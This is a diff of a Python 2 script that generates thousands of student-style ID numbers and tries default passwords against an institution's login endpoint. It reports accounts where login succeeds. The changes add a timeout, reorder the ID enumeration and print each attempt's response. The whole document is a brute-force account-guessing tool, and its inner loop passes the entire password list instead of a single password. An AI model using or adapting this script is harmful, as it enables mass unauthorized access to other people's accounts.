@@ -6,9 +6,10 @@
     date:2016-04-13
 '''
 
-import urllib2,threading,urllib,traceback,re,json
+import urllib2, threading, urllib, traceback, re, json
     
 skip_ids = ['2014E8018661141', '2014E8018661142']
+
 
 def login(num_str,passwd):
 	'''
@@ -25,7 +26,7 @@ def login(num_str,passwd):
 	data_encode = urllib.urlencode(post_data)
 	try:
 		req = urllib2.Request(login_url,data_encode,header)
-		cf = urllib2.urlopen(req)
+		cf = urllib2.urlopen(req, timeout = 10)
 		res = cf.read()
 		return res
 	except Exception,e:
@@ -34,9 +35,9 @@ def login(num_str,passwd):
 
 def generator():
     year = '2014'
-    features = ['1', '2', 'E', 'K']
-    for feature in features:
-        for institute in range(80002, 80186):
+    features = ['2', 'E', '1', 'K']
+    for institute in range(80002, 80186):
+        for feature in features:
             for subject in range(0, 99):
                 for index in range(0, 500):
                     yield year + feature + "%05d%02d%03d" % (institute, subject, index)
@@ -47,9 +48,11 @@ def main():
     for num in generator():
         if num in skip_ids:
             continue
+        print num
         for passwd in default_passwd:
             #print 'using ID:',num
             res = login(num, default_passwd)
+            print res
             if res:
                 json_data = json.loads(res)
                 if json_data and json_data.has_key('result') and json_data['result']=='success':
